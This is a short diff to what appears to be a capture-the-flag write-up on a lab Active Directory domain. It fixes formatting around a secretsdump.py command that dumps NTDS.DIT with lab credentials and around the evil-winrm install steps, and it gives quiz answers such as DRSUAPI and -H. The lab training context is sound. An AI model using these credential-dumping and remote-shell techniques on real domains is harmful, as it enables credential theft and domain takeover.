@@ -224,7 +224,7 @@ Exploiting this, we will effectively have full control over the AD Domain.
 
 What method allowed us to dump NTDS.DIT?
 
-Ran command `secretsdump.py -dc-ip 10.10.74.184 spookysec.local/backup:backup2517860@10.10.74.184
+Ran command `secretsdump.py -dc-ip 10.10.74.184 spookysec.local/backup:backup2517860@10.10.74.184`
 
 Answer-`DRSUAPI`
 
@@ -249,7 +249,9 @@ Answer-`-H`
 evil-winrm needed
 
 `git clone https://github.com/Hackplayers/evil-winrm`
+
 `sudo sudo gem install winrm winrm-fs stringio`
+
 git clone https://github.com/Hackplayers/evil-winrm.git`
 
 Flag Submission Panel
